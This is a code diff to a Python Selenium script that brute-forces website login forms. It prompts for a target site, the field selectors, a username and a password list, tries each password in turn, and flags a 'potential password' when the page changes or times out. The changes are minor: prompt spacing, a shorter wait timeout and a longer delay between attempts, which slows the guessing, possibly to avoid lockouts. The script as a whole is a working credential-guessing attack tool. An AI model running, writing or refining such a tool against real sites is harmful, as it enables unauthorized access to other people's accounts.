@@ -35,8 +35,8 @@ parser.add_option("--website", dest="website",help="choose a website")
 
 def wizard():
     print (banner)
-    website = input('[~]' + 'Enter a website: ')
-    sys.stdout.write('[!]' + 'Checking if site exists '),
+    website = input('[~]' + ' Enter a website: ')
+    sys.stdout.write('[!]' + ' Checking if site exists '),
     sys.stdout.flush()
     t.sleep(1)
     try:
@@ -47,21 +47,21 @@ def wizard():
     except selenium.common.exceptions.NoSuchElementException:
         pass
     except KeyboardInterrupt:
-        print ('[!]' + 'User used Ctrl-c to exit')
+        print ('[!]' + ' User used Ctrl-c to exit')
         exit()
     except:
         t.sleep(1)
         print ('[X]')
         t.sleep(1)
-        print ('[!]' + 'Website could not be located make sure to use http / https')
+        print ('[!]' + ' Website could not be located make sure to use http / https')
         exit()
 
 
-    username_selector = input('[~]' + 'Enter the username selector: ')
-    password_selector = input('[~]' + 'Enter the password selector: ')
-    login_btn_selector = input('[~]' + 'Enter the Login button selector: ')
-    username = input('[~]' + 'Enter the username to brute-force: ')
-    pass_list = input('[~]' + 'Enter a directory to a password list: ')
+    username_selector = input('[~]' + ' Enter the username selector: ')
+    password_selector = input('[~]' + ' Enter the password selector: ')
+    login_btn_selector = input('[~]' + ' Enter the Login button selector: ')
+    username = input('[~]' + ' Enter the username to brute-force: ')
+    pass_list = input('[~]' + ' Enter a directory to a password list: ')
     brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)
     
 def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
@@ -76,7 +76,7 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
     optionss.add_argument('--disable-extensions')
     optionss.add_argument('--no-sandbox')
     browser = webdriver.Chrome(options=optionss)
-    wait = WebDriverWait(browser, 15)
+    wait = WebDriverWait(browser, 10)
     while True:
         try:
             for line in f:
@@ -90,16 +90,16 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
                 print ('------------------------')
                 print ('Tried password: ' + line + 'for user: ' + username)
                 print ('------------------------ \n')
-                t.sleep(1)
+                t.sleep(5)
         except KeyboardInterrupt:
             print(' CTRL+C - Operation aborted by user')
             exit()
         except selenium.common.exceptions.NoSuchElementException:
-            print ('AN ELEMENT HAS BEEN REMOVED FROM THE TARGETPAGE \nMAYBE THE PASSWORD WAS FOUND! \nOR MAYBE YOU WERE BLOCKED \n')
+            print ('AN ELEMENT HAS BEEN REMOVED FROM THE TARGETPAGE \nMAYBE THE PASSWORD WAS FOUND! \nOR MAYBE YOU WERE BLOCKED... \n')
             print ('Potencial Password has been found: {0}' .format(line))
             exit()
         except selenium.common.exceptions.TimeoutException:
-            print ('THERE IS A TIMEOUT ON TARGETPAGE, \nMAYBE THE PASSWORD WAS FOUND! \nOR MAYBE YOU WERE BLOCKED \n')
+            print ('THERE IS A TIMEOUT ON TARGETPAGE, \nMAYBE THE PASSWORD WAS FOUND! \nOR MAYBE YOU WERE BLOCKED... \n')
             print ('Potencial Password has been found: {0}' .format(line))
             exit()
 
